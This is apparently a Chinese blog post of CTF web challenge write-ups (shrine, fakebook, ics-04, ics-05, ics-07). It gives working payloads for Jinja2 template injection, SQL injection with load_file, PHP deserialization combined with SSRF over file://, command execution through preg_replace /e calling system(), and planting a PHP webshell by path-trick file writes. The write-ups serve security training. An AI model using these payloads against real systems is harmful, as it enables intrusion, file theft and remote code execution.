    shrine

    题目来源：TokyoWesterns CTF

    打开页面是一段源码
    参考
    CTFTIME上的解析https://ctftime.org/writeup/10895
    大佬的博客https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/

    import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


def ():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)

    这是一个flask在/shrine/下的SSTI。
    safe_jinja()函数对参数进行了过滤：

    • 将“(”和“)”替换为空字符
    • 将config和self加入了黑名单，让它们返回None

    输入参数进行模板探测

    { {77} }

    { {7\    ‘7’} }

    发现是jinja2或Twig，后端源码为flask
    一般探测步骤

    由于对()和config、self进行过滤，所以还剩下get_flashed_messages(), url_for()这两个内置函数，可以构造

    { {get_flashed_messages.\globals__[‘current_app’].config[‘FLAG’]} }
    或
    { {url_for.\globals__[‘current_app’].config[‘FLAG’]} }

    关于模板SSTI模板注入，用另一篇文章来详解

    fakebook

    题目来源：网鼎杯 2018

    还是挺有意思的一道题
    进入网页后有登录和注册，那就先注册一个账号，注册时发现blog处要填写url。
    注册完毕后查看个人信息，发现web应用加载了用户的blog网址

    这里我填了一个不存在的url所有没有加载出来。这里就存在SSRF漏洞（服务器会访问blog里的url）
    对网站进行目录扫描，发现flag.php文件在根目录下，还发现了robots.txt文件，发现源码，想必flag就在这个文件中了，我们要做的就是想办法读取它。同时发现这个页面还存在sql注入。

    对此页面进行注入，发现这个表有4个字段，第二个字段为用户名，第三个字段为年龄，第四个字段放的就是blog的url，这里对空格进行了过滤所以使用/**/来绕过

    发现服务器对数据进行了反序列化的处理，由此可知，在数据库里的数据是序列化后的数据，再结合泄露的源码，我们就可以利用SSRF漏洞让服务器读取本地的flag.php文件。

    泄露的源码
    fakebook.php.bak

    序列化脚本

    <?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
$a = new UserInfo();
$a->name='34';
$a->age=12;
$a->blog='file:///var/www/html/flag.php'; //本地的flag文件路径
echo serialize($a);
?>

    序列化后的数据

    O:8:”UserInfo”:3:{s:4:”name”;s:2:”34”;s:3:”age”;i:12;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}

    payload:

    -1/**/union/**/select/**/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:20;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} ‘

    访问后查看源代码，里面有经过base64编码后的flag

    这里还有一个非预期的解法,这里题目没有过滤load_file文件
    payload

    /view.php?no=0+unIon/**/select+1,load_file(‘/var/www/html/flag.php’),1,1

    ics-04

    题目来源：XCTF 4th-CyberEarth

    通过点击发现有登录，注册，和找回密码页面。
    对各个页面进行测试发现，找回密码处存在sql注入，是POST注入，利用bp抓包，然后后跑包，爆出数据库


    管理员用户名应该就是c3tlwDIn23，密码是经过MD5加密的，拿去解密即可得到密码，然后去登陆即可得到flag。
    或者是使用这个用户名去注册，密码自己填，这样就相当于给管理员重置密码了。这很明显是因为注册时服务器没有检查用户是否已经存在。

    ics-05

    题目来源：XXCTF 4th-CyberEarth

    根据题目提示，进入设备维护中心页面，发现页面返回一片空白。地址栏里也没有请求参数。
    那就先查看网页源码，看看有什么。

    发现了，这个页面是有请求参数的，当然这里没有与数据库的交互场景，所以排除sql注入的可能。
    经过尝试发现参数内容会在页面显示。

    想到，这存在php伪协议，这会造成任意文件读取漏洞。

    page=php://filter/read=convert.base64-encode/resource=index.php

    获得了base64编码后的index页面的源码
    为什么中间要转base64编码，如果不转码，则相当于进行请求网页（继续打开网页）
    输入payload得到一段base64

    放入notepad++解码，进行源码分析

    伪造XFF头来登入系统，同时利用preg_replace函数的漏洞
    preg_replace 函数执行一个正则表达式的搜索和替换，preg_replce正则表达式部分包含e参数的时候，进行替换的部分会被执行。
    当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行
    于是构造payload

    ?pat=/123/e&rep=system(‘cat+s3chahahaDir/flag/flag.php’)&sub=123


    这里文件路径通过ls查看，不断试出来即可。

    ics-07

    题目来源：XCTF 4th-CyberEarth

    题目说了是页面解析漏洞，可以看源码，分析源码

    第一段

    <?php
    if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
    } else {
        $result = False;
        die();
    }
        if(!$result)die("<br >something wae wrong ! <br>");
        if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
    }
?>

    我们只需要绕过isset($_GET[id]) && floatval($_GET[id]) !== ‘1’ && substr($_GET[id], -1) === ‘9’
    拿到 $_SESSION[‘admin’] = True;
    构造payload：?id=1/9&submit&page=flag.php

    这里1/9的floatval的值不等于1且是9结尾，所以符号条件，得到了admin的session

    下一段

    <?php
    if ($_SESSION['admin']) {
    $con = $_POST['con'];
    $file = $_POST['file'];
    $filename = "backup/".$file;
    if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
        die("Bad file extension");
    }else{
        chdir('uploaded'); //这里需要注意路径已经切换到uploaded下面了，所以最后我们写入的文件在“/uploaded/backup/”下了
        $f = fopen($filename, 'w');
        fwrite($f, $con);
        fclose($f);
       }
    }
?>

    这里的正则没看懂，拿去在线匹配也没匹配到什么😂
    看了大佬的wp
    说这个是只过滤了最后一个”.”后面的东西。

    可以使用filename/.来过滤

    现在写个一句话进去
    con是文件内容
    file是文件名
    使用POST传参

    con=&file=../kill.php/.


    注意，我们要在第一个前提下才能进行这一步的文件写入操作
    菜刀连接即可

    其实这就是一个简单的文件包含，就是正则表达式的绕过😂
